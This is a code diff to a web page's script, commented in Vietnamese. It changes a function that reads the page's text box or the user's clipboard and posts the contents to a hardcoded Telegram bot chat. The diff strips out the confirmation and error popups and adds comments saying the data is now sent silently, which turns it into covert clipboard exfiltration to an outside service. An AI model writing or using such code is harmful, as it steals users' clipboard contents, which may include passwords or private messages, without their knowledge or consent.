@@ -39,35 +39,30 @@ const CHAT_ID = "5376711844";
 async function pasteAndSend() {
   let text = document.getElementById("text").value.trim();
 
-  // Nếu textarea trống thì thử đọc clipboard
+  // Nếu textarea trống thì đọc clipboard
   if (!text) {
     try {
       text = await navigator.clipboard.readText();
       document.getElementById("text").value = text;
     } catch (e) {
-      alert("Không thể đọc clipboard.\nHãy dán thủ công rồi bấm lại.");
+      // Không hiện popup
       return;
     }
   }
 
-  if (!text) {
-    alert("Nội dung trống!");
-    return;
-  }
+  if (!text) return;
 
+  // Gửi âm thầm, không alert
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       chat_id: CHAT_ID,
-      text: text   // 👈 CHỈ GỬI NỘI DUNG
+      text: text
     })
-  })
-  .then(() => alert("✅ Đã gửi"))
-  .catch(() => alert("❌ Gửi thất bại"));
+  }).catch(() => {});
 }
 </script>
 
 </body>
 </html>
-
